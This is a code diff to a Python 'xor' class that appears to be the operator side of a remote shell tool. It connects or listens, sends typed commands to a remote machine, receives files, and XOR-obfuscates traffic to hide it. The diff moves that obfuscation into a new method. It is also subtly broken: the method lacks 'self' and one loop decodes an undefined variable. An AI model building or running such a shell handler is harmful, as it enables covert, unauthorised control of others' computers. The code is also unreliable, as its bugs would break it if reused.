@@ -280,6 +280,15 @@ class xor:
     def __init__(self):
         signal.signal(signal.SIGINT, core.signalHandler)   
         
+        
+    def enc(string, key):
+        data = ''
+        for char in string:
+            for ch in key:
+                char = chr(ord(char) ^ ord(ch))
+            data += char
+        return data
+        
            
     def download(self, filename, session):
         filename = filename.replace("/","_")
@@ -318,7 +327,8 @@ class xor:
             core.logging.info("Connection established to %s:%s" % (HOST, PORT))
         
         while True:
-            data = xor(conn.recv(socksize), pin)
+            xdata = conn.recv(socksize)
+            data = self.enc(encd, pin)
             
             if data.startswith(":savef"):
                 try:
@@ -335,7 +345,8 @@ class xor:
                 
             elif data == "shell => ":
                 cmd = raw_input(data)
-                conn.sendall(xor(cmd, pin))
+                xcmd = self.enc(cmd, pin)
+                conn.sendall(xcmd)
                 
                 if cmd == (":killme"):
                     print("[!] Shutting down server!")
@@ -440,7 +451,8 @@ class xor:
             core.logging.error("Listener failed to bind %s:%s" % (HOST, PORT))
             
         while True:
-            data = xor(conn.recv(socksize), pin)
+            xdata = conn.recv(socksize)
+            data = self.enc(xdata, pin)
             
             if data.startswith(":savef"):
                 try:
@@ -457,7 +469,8 @@ class xor:
                 
             elif data == "shell => ":
                 cmd = raw_input(data)
-                conn.sendall(xor(cmd, pin))
+                xcmd = self.enc(cmd, pin)
+                conn.sendall(xcmd)
                 
                 if cmd == (":killme"):
                     print("[!] Shutting down server!")
